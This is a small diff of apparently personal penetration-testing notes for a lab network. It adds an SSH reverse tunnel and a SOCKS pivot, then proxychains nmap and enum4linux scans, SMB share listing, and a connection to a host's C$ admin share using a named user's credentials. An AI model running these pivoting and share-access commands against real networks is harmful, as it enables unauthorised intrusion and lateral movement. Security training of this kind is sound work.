@@ -1,4 +1,8 @@
-ssh -R 9050:localhost:22 kali@192.168.2.53
+reverse tunnel: ssh -R 9050:localhost:22 kali@192.168.2.53
+ssh -NfD
+9050 root@squid
 proxychains nmap -Pn -sT -v 192.168.3.3 -p 445
 proxychains enum4linux -S -u aita -p **** 192.168.3.3
+smbclient -U aita%pass -L //192.168.3.3
+smbclient -U aita%pass  //192.168.3.3/c$
 
